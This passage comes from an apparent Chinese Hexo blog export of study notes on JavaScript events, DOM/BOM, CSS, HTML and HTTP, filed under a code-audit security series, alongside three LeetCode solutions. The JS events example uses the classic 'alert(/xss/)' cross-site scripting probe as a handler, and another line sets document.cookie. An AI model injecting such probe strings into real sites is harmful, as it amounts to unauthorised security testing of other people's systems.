class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunction</span>(<span class="params">var1,var2</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">代码</span><br><span class="line">return 返回值 #有需要时用</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="八、JS通过对象操作浏览器（BOM）"><a href="#八、JS通过对象操作浏览器（BOM）" class="headerlink" title="八、JS通过对象操作浏览器（BOM）"></a>八、JS通过对象操作浏览器（BOM）</h3><p>1、Window对象：代表浏览器窗口，全局变量是 window 对象的属性，全局函数是 window 对象的方法，甚至 HTML DOM 的 document 也是 window 对象的属性之一。</p><p>2、window.navigator对象：包含有关访问者浏览器的信息。</p><blockquote><p><strong>window.navigator</strong> 对象在编写时可不使用 window 这个前缀。</p><p>navigator.userappVersion、navigator.userAgent</p></blockquote><p>3、window.screen对象：屏幕信息。</p><p>4、window.location对象：URL信息。</p><p>5、window.document对象：当前页面。</p><h3 id="九、JS通过对象操作页面（DOM）"><a href="#九、JS通过对象操作页面（DOM）" class="headerlink" title="九、JS通过对象操作页面（DOM）"></a>九、JS通过对象操作页面（DOM）</h3><p>1、查找标签、节点等方法1、：<code>document.getElementById、document.getElementsByXXX、节点名.childer、节点名.firstElementChild、节点名.lastElementChild</code></p><p>2、操作cookie：<code>document.cookie=&#123;&quot;name=AJEST&quot;&#125;</code></p><h3 id="十、JS事件"><a href="#十、JS事件" class="headerlink" title="十、JS事件"></a>十、JS事件</h3><p>用户触发事件的判断：鼠标事件(onclick)、键盘事件、form事件……</p><p>对触发的事件做事件响应：写在html标签中</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(/xss/)&quot;</span> <span class="attr">value</span>=<span class="string">&quot;bu1&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;fm()&quot;</span> <span class="attr">value</span>=<span class="string">&quot;bu2&quot;</span> /&gt;</span>#鼠标悬停</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">fm</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    alert(<span class="string">&#x27;xss&#x27;</span>);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4、CSS语言</title>
      <link href="/2020/07/29/%E9%98%B6%E6%AE%B5%E4%B8%89%E3%80%81%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/4%E3%80%81CSS%E8%AF%AD%E8%A8%80/"/>
      <url>/2020/07/29/%E9%98%B6%E6%AE%B5%E4%B8%89%E3%80%81%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/4%E3%80%81CSS%E8%AF%AD%E8%A8%80/</url>
      
        <content type="html"><![CDATA[<h2 id="CSS语言"><a href="#CSS语言" class="headerlink" title="CSS语言"></a>CSS语言</h2><h3 id="一、什么是CSS"><a href="#一、什么是CSS" class="headerlink" title="一、什么是CSS"></a>一、什么是CSS</h3><p>层叠样式表 (<em>C</em>ascading <em>S</em>tyle <em>S</em>heets)，提倡代码的编写中，CSS和HTML分离。</p><h3 id="二、常用CSS样式"><a href="#二、常用CSS样式" class="headerlink" title="二、常用CSS样式"></a>二、常用CSS样式</h3><p>元素内容的颜色：<code>color</code></p><blockquote><p>RGB颜色：<code>rgb([0-255],[0-255],[0-255])、#FFFFFF</code></p></blockquote><p>元素内容的背景色：<code>background-color</code></p><p>字体大小：<code>font-size</code></p><h3 id="三、CSS部署方式"><a href="#三、CSS部署方式" class="headerlink" title="三、CSS部署方式"></a>三、CSS部署方式</h3><p>1、内联样式：把CSS写在标签内部style属性的值中。</p><p>2、内部样式：在<code>&lt;head&gt;&lt;/head&gt;</code>标签中的<code>&lt;style type=&quot;text/css&quot;&gt;&lt;/style&gt;</code>标签中用<u>选择器</u>定义css样式。</p><p>​    <strong>选择器</strong>：1、标签选择器：<code>标签名 &#123;样式&#125;</code>；2、类选择器：<code>.类名 &#123;样式&#125;</code>；3、id选择器：<code>#id &#123;样式&#125;</code></p><p>3、外部样式：用.css为文件后缀的文件专门存放css样式内容。使用<code>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css文件地址&quot;&gt;</code>来导入外部存储的样式。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>50-Pow(x，n)</title>
      <link href="/2020/07/28/Leetcode/50%E3%80%81Pow(x%EF%BC%8Cn)/"/>
      <url>/2020/07/28/Leetcode/50%E3%80%81Pow(x%EF%BC%8Cn)/</url>
      
        <content type="html"><![CDATA[<h2 id="50、Pow-x，n"><a href="#50、Pow-x，n" class="headerlink" title="50、Pow(x，n)"></a>50、Pow(x，n)</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><p><a href="https://imgchr.com/i/aVnRG4"><img src="https://s1.ax1x.com/2020/07/28/aVnRG4.png" alt="aVnRG4.png"></a></p><h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><blockquote><p>分治法本质刨析 （暂时并未看懂）：</p><p><a href="https://leetcode-cn.com/problems/powx-n/solution/50-powx-n-kuai-su-mi-qing-xi-tu-jie-by-jyd/">https://leetcode-cn.com/problems/powx-n/solution/50-powx-n-kuai-su-mi-qing-xi-tu-jie-by-jyd/</a> </p></blockquote><p>​    快速幂解法，当计算比如 pow(2, 16)时，最笨的方法是2<em>15次2，如果使用快速幂解法的思想，就是：2\</em>2 = 2^2、2^2 * 2^2 = 2^4 、2^4 * 2^4 = 2^8、2^8 * 2^8 = 2^16。快速幂解法只需要4次运算即可得出结果。将时间复杂度降低至从 O(n)降到 O(logn) </p><p>​    上述例子是n是偶数时，如果n是奇数时最少的运算次数就需要从x^n往前推。x^n 的n如果是偶数： x^n = x^(2/n) * x^(2/n)；如果n是奇数：x^n = x^(2/n) * x^(2/n) * x。直到推到n等于0时结束。这种解法大佬们称其为分治法，使用递归实现。</p><p>​    这里有个小坑就是题目规定n是32位有符号整数，为了处理n是负数的情况，我在myPow中判断了一下n的正负，如果为负只需要将幂结果取个倒数即可。但测试中有一个n为INT_MIN的用例，-INT_MIN = INT_MAX + 1，因此超出了int的范围，所以需要使用一个长整型long long类型来存储，这样就可以容纳INT_MAX+1的数值了。</p><blockquote><p>快速幂分治解法，从结果递归逆推，暂未学透。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">myPow</span><span class="params">(<span class="keyword">double</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> N = n;</span><br><span class="line">        <span class="keyword">return</span> N &gt;= <span class="number">0</span> ? fenzhi(x, N) : <span class="number">1.0</span> / fenzhi(x, -N);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">fenzhi</span><span class="params">(<span class="keyword">double</span> x, <span class="keyword">long</span> <span class="keyword">long</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1.0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">double</span> y = fenzhi(x, n/<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">return</span> n % <span class="number">2</span> == <span class="number">0</span> ? y * y : y * y * x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Leetcode题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>49-字母异位词分组</title>
      <link href="/2020/07/28/Leetcode/49%E3%80%81%E5%AD%97%E6%AF%8D%E5%BC%82%E4%BD%8D%E8%AF%8D%E5%88%86%E7%BB%84/"/>
      <url>/2020/07/28/Leetcode/49%E3%80%81%E5%AD%97%E6%AF%8D%E5%BC%82%E4%BD%8D%E8%AF%8D%E5%88%86%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<h2 id="49、字母异位词分组"><a href="#49、字母异位词分组" class="headerlink" title="49、字母异位词分组"></a>49、字母异位词分组</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><a href="https://imgchr.com/i/aEvbe1"><img src="https://s1.ax1x.com/2020/07/28/aEvbe1.png" alt="aEvbe1.png"></a></p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>方法1（未编写）：利用质数的性质，将26个字母转换为26个不同的质数，然后分别对每个字符串转换为字符串内每个字母转换的质数相乘的积，因此所有积相同的字符串就是异位词，最后将所有字符串进行hash存储即可，主键是乘积，值是字符串，最后得到的每个map中的字符串数组即是分组结果。</p><p>方法2（编写的答案）：将所有字符串按照字母升序排序，所有异位词必然会相同，然后同理对所有字符串进行Hash存储即可，主键为排序后的字符串，值为排序前字符串，最后得到的每个map中的字符串数组即是分组结果。</p><blockquote><p>1、字母转质数，字符串转质数积，哈希即可；</p><p>2、字符串排序，异位词必相等，哈希即可；</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&gt; <span class="title">groupAnagrams</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; strs)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&gt; res;</span><br><span class="line">        <span class="built_in">map</span>&lt;<span class="built_in">string</span>, <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&gt; m;</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">string</span>&amp; s : strs) &#123;</span><br><span class="line">            <span class="built_in">string</span> tmp=s;</span><br><span class="line">            sort(tmp.<span class="built_in">begin</span>(), tmp.<span class="built_in">end</span>());</span><br><span class="line">            m[tmp].push_back(s);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; r : m) &#123;</span><br><span class="line">            res.push_back(r.second);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Leetcode题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3、HTML</title>
      <link href="/2020/07/28/%E9%98%B6%E6%AE%B5%E4%B8%89%E3%80%81%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/3%E3%80%81HTML%E8%AF%AD%E8%A8%80/"/>
      <url>/2020/07/28/%E9%98%B6%E6%AE%B5%E4%B8%89%E3%80%81%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/3%E3%80%81HTML%E8%AF%AD%E8%A8%80/</url>
      
        <content type="html"><![CDATA[<h2 id="HTML语言"><a href="#HTML语言" class="headerlink" title="HTML语言"></a>HTML语言</h2><h3 id="一、什么是HTML？"><a href="#一、什么是HTML？" class="headerlink" title="一、什么是HTML？"></a>一、什么是HTML？</h3><p>HTML 是用来描述网页的一种语言，属于解释型的语言。以.html、.htm为文件拓展名。</p><ul><li>HTML 指的是超文本标记语言 (<strong>H</strong>yper <strong>T</strong>ext <strong>M</strong>arkup <strong>L</strong>anguage)</li><li>HTML 不是一种编程语言，而是一种<strong>标记语言</strong>(markup language)</li><li>标记语言是一套<strong>标记标签</strong> (markup tag)</li><li>HTML 使用<strong>标记标签</strong>来描述网页</li></ul><h3 id="二、HTML基础"><a href="#二、HTML基础" class="headerlink" title="二、HTML基础"></a>二、HTML基础</h3><p><strong>HTML标记语言</strong>：尖括号包含关键字组成标签。</p><p><strong>HTML标签</strong>：有双标签和单标签。标签中有属性，属性的格式是键值对。</p><p><code>&lt;html&gt;</code>    开始标签； <code>&lt;/html&gt;</code>    结束标签。（双标签）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">一个标准的HTML文档结构：html(head、body)</span><br><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;        #头部head包括文档控制信息，包括整个页面的编码、说明等。</span><br><span class="line">        &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;        #身体body包含真正显示在网页的内容</span><br><span class="line">    </span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h3 id="三、HTML文档结构"><a href="#三、HTML文档结构" class="headerlink" title="三、HTML文档结构"></a>三、HTML文档结构</h3><p>HTML文档在浏览器中被渲染时，浏览器将其分析为一颗DOM树形结构（DOM文档对象模型 由浏览器构造），以<code>&lt;html&gt;&lt;/html&gt;</code>为根节点。</p><h4 id="四、HTML常用标签"><a href="#四、HTML常用标签" class="headerlink" title="四、HTML常用标签"></a>四、HTML常用标签</h4><p><code>&lt;title&gt;&lt;/title&gt;</code>    #浏览器标签页的标题</p><p><code>&lt;meta charset=&quot;utf-8&quot;&gt;</code>    #通知浏览器当前页面的编码格式是utf-8</p><p><code>&lt;hn&gt;&lt;/hn&gt;</code>    #标题标签：n越大，字体越小。</p><p><code>&lt;p&gt;&lt;/p&gt;</code>    #段落标签：定义段落。</p><p><code>&lt;hr/&gt;</code>    #水平线</p><p><code>&lt;br/&gt;</code>    #换行标签</p><p><code>&lt;span style=&quot;XXX&quot;&gt;&lt;/span&gt;</code>    #定义行内元素属性的标签</p><p><code>&lt;div&gt;&lt;/div&gt;</code>    #块级元素</p><p><code>&lt;a&gt;&lt;/a&gt;</code>    #超链接标签</p><blockquote><p>href属性    跳转的地址</p><p>target属性    如果不写target跳转页面在当前标签页打开;如果该属性赋值”_blank”，在新的标签页打开；也可以指定一个iframe，将新页面在iframe中嵌入</p></blockquote><p><code>&lt;img&gt;&lt;/img&gt;</code>    #图片标签</p><blockquote><p>src属性    图片的地址</p></blockquote><p><code>&lt;pre&gt;&lt;/pre&gt;</code>    #格式化输出标签，常用于显示源代码</p><h3 id="五、注释与特殊字符"><a href="#五、注释与特殊字符" class="headerlink" title="五、注释与特殊字符"></a>五、注释与特殊字符</h3><p>1、注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">    注释不会显示在前台页面，但是会出现在源代码中。</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>2、特殊字符/字符实体</p><p><a href="https://www.w3school.com.cn/html/html_entities.asp">https://www.w3school.com.cn/html/html_entities.asp</a></p><p><code>&amp;nbsp;</code>    #空格</p><h3 id="六、HTML表格"><a href="#六、HTML表格" class="headerlink" title="六、HTML表格"></a>六、HTML表格</h3><p><code>&lt;table&gt;&lt;/table&gt;</code>    #表格</p><p><code>&lt;tr&gt;&lt;/tr&gt;</code>    #行</p><p><code>&lt;td&gt;&lt;/td&gt;</code>    #列</p><blockquote><p>colspan    跨列属性</p><p>rowspan    跨行属性</p></blockquote><h3 id="七、HTML表单"><a href="#七、HTML表单" class="headerlink" title="七、HTML表单"></a>七、HTML表单</h3><p><strong>什么是表单</strong>：表单实际上就是一个框架，里面包括了很多空间元素，是与后台服务器进行数据交互的主要载体。</p><p><code>&lt;form&gt;&lt;/form&gt;</code>    #表单</p><blockquote><p>action    数据提交到服务器的URL，如果为空提交到当前页面，也可使用绝对路径和相对路径</p><p>method    提交方法(get post head options )，默认是get</p><p>enctype    （application/x-www-form-urlencoded默认值、multipart/form-data上传文件时使用）</p></blockquote><p><code>&lt;input /&gt;</code>    #输入框</p><blockquote><p>name    给标签起个名字（变量名）</p><p>value    标签的值（变量值）</p><p>type    标签类型</p><p>​            (password密码框、text文本框、radio单选框、checkbox多选框、reset重置该表单内容的按钮、submit提交此表单的按钮、file文件域、hidden 隐藏内容，一般用于存储token)，多个框需要同一个名字</p></blockquote><p><code>&lt;select&gt;&lt;/select&gt;</code>    #选择框</p><p><code>&lt;option&gt;&lt;/option&gt;</code>    #选择框内的选项</p><blockquote><p>selected selected 属性规定在页面加载时预先选定该选项。</p></blockquote><p><code>&lt;textarea&gt;&lt;/textarea&gt;</code>        #文本域，可以输入回车换行符号</p><h3 id="八、iframe标签"><a href="#八、iframe标签" class="headerlink" title="八、iframe标签"></a>八、iframe标签</h3><p>iframe是一个可以内嵌其他网页文档的行内元素。</p><p><code>&lt;iframe&gt;&lt;/iframe&gt;</code></p><blockquote><p>src    iframe中嵌入的文档地址</p><p>height    高度</p><p>width    宽度</p><p>framebroder    是否显示边框</p><p>scrolling    是否显示滚动条</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 代码审计安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>48-旋转图像</title>
      <link href="/2020/07/27/Leetcode/48%E3%80%81%E6%97%8B%E8%BD%AC%E5%9B%BE%E5%83%8F/"/>
      <url>/2020/07/27/Leetcode/48%E3%80%81%E6%97%8B%E8%BD%AC%E5%9B%BE%E5%83%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="48、旋转图像"><a href="#48、旋转图像" class="headerlink" title="48、旋转图像"></a>48、旋转图像</h2><p><a href="https://leetcode-cn.com/problems/rotate-image/">https://leetcode-cn.com/problems/rotate-image/</a></p><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><p><a href="https://imgchr.com/i/aFGvJU"><img src="https://s1.ax1x.com/2020/07/27/aFGvJU.png" alt="aFGvJU.png"></a></p><h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><p>方法1：找规律（我一开始的思路就是这样，但是这个规律挺难找我没找出来）</p><p>即:任意一个<code>(i,j) , (j, n-i-1), (n-i-1, n-j-1), (n -j-1, i)</code>就是这四个索引号上的数相邻依次交换.</p><p>方法2：先数组沿着行中间上下翻折一次，然后沿着正对角线再翻转一次，所得结果即是旋转后的数组（真的顶）</p><p><a href="https://imgchr.com/i/aFJ26J"><img src="https://s1.ax1x.com/2020/07/27/aFJ26J.png" alt="aFJ26J.png"></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#方法2</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rotate</span>(<span class="params">self, matrix: List[List[int]]</span>) -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Do not return anything, modify matrix in-place instead.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        n=len(matrix)</span><br><span class="line">        matrix[:] = matrix[::<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(i+<span class="number">1</span>, n):</span><br><span class="line">                matrix[i][j], matrix[j][i] = matrix[j][i], matrix[i][j]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Leetcode题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2、Http协议</title>
      <link href="/2020/07/27/%E9%98%B6%E6%AE%B5%E4%B8%89%E3%80%81%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/2%E3%80%81Http%E5%8D%8F%E8%AE%AE/"/>
      <url>/2020/07/27/%E9%98%B6%E6%AE%B5%E4%B8%89%E3%80%81%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/2%E3%80%81Http%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="Http协议"><a href="#Http协议" class="headerlink" title="Http协议"></a>Http协议</h2><p><a href="https://labuladong.gitbook.io/algo/labuladong-he-ta-de-peng-you-men/30-zhang-tu-jie-http-chang-jian-mian-shi-ti#05-http-1-1http-2-http3-yan-bian">https://labuladong.gitbook.io/algo/labuladong-he-ta-de-peng-you-men/30-zhang-tu-jie-http-chang-jian-mian-shi-ti#05-http-1-1http-2-http3-yan-bian</a></p><h3 id="一、什么是Http协议"><a href="#一、什么是Http协议" class="headerlink" title="一、什么是Http协议"></a>一、什么是Http协议</h3><p>超文本传输协议（英文：<strong>H</strong>yper<strong>T</strong>ext <strong>T</strong>ransfer <strong>P</strong>rotocol，缩写：HTTP）HTTP 是一个在计算机世界里专门在「两点」之间「传输」文字、图片、音频、视频等「超文本」数据的「约定和规范」。</p><p><u>目前应用最广泛的Http协议是Http1.1</u></p><h3 id="二、Http协议的特点"><a href="#二、Http协议的特点" class="headerlink" title="二、Http协议的特点"></a>二、Http协议的特点</h3><p><strong>1、简单快速</strong>：向服务器发出请求，只需要提供请求方法和请求路径。请求方法常用的有GET、HEAD、POST。</p><p>​    HTTP 基本的报文格式就是 <code>header + body</code>，头部信息也是 <code>key-value</code> 简单文本的形式，<strong>易于理解</strong>，降低了学习和使用的门槛。</p><p><strong>2、灵活</strong>：Http协议支持传输任何类型的数据对象。数据对象类型由Content-Type标记。</p><p><strong>3、无连接</strong>：无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。</p><p><strong>4、无状态</strong>：Http协议是无状态协议，无状态是指Http协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重新来过。</p><blockquote><p>无状态的<strong>好处</strong>，因为服务器不会去记忆 HTTP 的状态，所以不需要额外的资源来记录状态信息，这能减轻服务器的负担，能够把更多的 CPU 和内存用来对外提供服务。</p><p>无状态的<strong>坏处</strong>，既然服务器没有记忆能力，它在完成有关联性的操作时会非常麻烦。</p><p>例如登录-&gt;添加购物车-&gt;下单-&gt;结算-&gt;支付，这系列操作都要知道用户的身份才行。但服务器不知道这些请求是有关联的，每次都要问一遍身份信息。    </p><p>对于无状态的问题，解法方案有很多种，其中比较简单的方式用 <strong>Cookie</strong> 技术。</p><p><code>Cookie</code> 通过在请求和响应报文中写入 Cookie 信息来控制客户端的状态。</p></blockquote><p><strong>5、长连接：</strong>早期 HTTP/1.0 性能上的一个很大的问题，那就是每发起一个请求，都要新建一次 TCP 连接（三次握手），而且是串行请求，做了无谓的 TCP 连接建立和断开，增加了通信开销。</p><p>​    为了解决上述 TCP 连接问题，HTTP/1.1 提出了<strong>长连接</strong>的通信方式，也叫持久连接。这种方式的好处在于减少了 TCP 连接的重复建立和断开所造成的额外开销，减轻了服务器端的负载。</p><p>​    持久连接的特点是，只要任意一端没有明确提出断开连接，则保持 TCP 连接状态。</p><p><a href="https://imgchr.com/i/akfnHI"><img src="https://s1.ax1x.com/2020/07/28/akfnHI.png" alt="akfnHI.png"></a></p><p><strong>6、管道网络传输：</strong>HTTP/1.1 采用了长连接的方式，这使得管道（pipeline）网络传输成为了可能。即可在同一个 TCP 连接里面，客户端可以发起多个请求，只要第一个请求发出去了，不必等其回来，就可以发第二个请求出去，可以<strong>减少整体的响应时间。</strong></p><p>​    举例来说，客户端需要请求两个资源。以前的做法是，在同一个TCP连接里面，先发送 A 请求，然后等待服务器做出回应，收到后再发出 B 请求。管道机制则是允许浏览器同时发出 A 请求和 B 请求。但是服务器还是按照<strong>顺序</strong>，先回应 A 请求，完成后再回应 B 请求。要是前面的回应特别慢，后面就会有许多请求排队等着。这称为「队头堵塞」。</p><p><a href="https://imgchr.com/i/akfQ4f"><img src="https://s1.ax1x.com/2020/07/28/akfQ4f.png" alt="akfQ4f.png"></a></p><h3 id="三、URL"><a href="#三、URL" class="headerlink" title="三、URL"></a>三、URL</h3><h4 id="1、URL：-统一资源定位器-Uniform-Resource-Locators"><a href="#1、URL：-统一资源定位器-Uniform-Resource-Locators" class="headerlink" title="1、URL： 统一资源定位器(Uniform Resource Locators)"></a>1、URL： 统一资源定位器(Uniform Resource Locators)</h4><p>HTTP使用统一资源标识符（Uniform Resource Identifiers, URI）来传输数据和建立连接，URL是一种特殊类型的URI。</p><p>1）URL格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scheme:&#x2F;&#x2F;host.domain:port&#x2F;path&#x2F;filename?args#锚</span><br></pre></td></tr></table></figure><blockquote><ul><li>scheme - 定义因特网服务的类型。最常见的类型是 http(https/ftp/file)</li><li>host - 定义域主机（http 的默认主机是 www）</li><li>domain - 定义因特网域名，比如 runoob.com （host-domain可以是IP地址）</li><li>:port - 定义主机上的端口号（http 的默认端口号是 80）</li><li>path - 定义服务器上的路径（如果省略，则文档必须位于网站的根目录中）。</li><li>filename - 定义文档/资源的名称</li><li>args - 传入文档的参数</li><li>锚部分：从#到最后，定位页面</li></ul></blockquote><p>2）URL的字符编码：URL中只能用ASCII字符集，非ASCII字符集要经过编码，并且每字节编码前都要加%。（google浏览器显示URL中的汉字不会转换，但IE浏览器会转换为utf-8）。另外，URL 不能包含空格。URL 编码通常使用 + 来替换空格。</p><h3 id="四、Http请求报文"><a href="#四、Http请求报文" class="headerlink" title="四、Http请求报文"></a>四、Http请求报文</h3><p><a href="https://imgchr.com/i/akDpJs"><img src="https://s1.ax1x.com/2020/07/28/akDpJs.png" alt="akDpJs.png"></a></p><p>请求方法：Http1.1中定义9种方法：GET、POST、HEAD、OPTIONS、PUT、PATCH、DELETE、TRACE 、CONNECT </p><blockquote><table><thead><tr><th align="left">序号</th><th align="left">方法</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">GET</td><td align="left">请求指定的页面信息，并返回实体主体。（get url最长1024）</td></tr><tr><td align="left">2</td><td align="left">HEAD</td><td align="left">类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头</td></tr><tr><td align="left">3</td><td align="left">POST</td><td align="left">向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和/或已有资源的修改。</td></tr><tr><td align="left">4</td><td align="left">PUT</td><td align="left">从客户端向服务器传送的数据取代指定的文档的内容。</td></tr><tr><td align="left">5</td><td align="left">DELETE</td><td align="left">请求服务器删除 Request-URI 所标识的资源。</td></tr><tr><td align="left">6</td><td align="left">CONNECT</td><td align="left">HTTP/1.1 协议中预留给能够将连接改为管道方式的代理服务器。</td></tr><tr><td align="left">7</td><td align="left">OPTIONS</td><td align="left">返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送’*’的请求来测试服务器的功能性，允许客户端查看服务器的性能。</td></tr><tr><td align="left">8</td><td 